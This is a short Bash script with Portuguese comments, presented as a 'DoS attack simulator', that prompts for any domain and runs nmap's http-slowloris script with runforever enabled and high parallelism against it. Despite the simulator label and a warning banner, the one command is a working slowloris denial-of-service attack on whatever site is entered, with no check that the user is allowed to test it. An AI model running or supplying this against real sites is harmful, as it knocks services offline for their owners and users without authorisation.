#!/bin/bash

#################################################
# Simulador de ataques Dos em sites vulneráveis #
#################################################
# author: Raulex Ramos ##########################
# date: 28/10/2020 ##############################
#################################################

echo "################################"
echo "# SIMULADOR DE ATAQUE DoS ######"
echo "##########CUIDADO###############"
echo "# PODE GERAR INDISPONIBILIDADE##"
echo "################################"

echo "Digite um dominio: "
read userDominio

sudo nmap --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true $userDominio
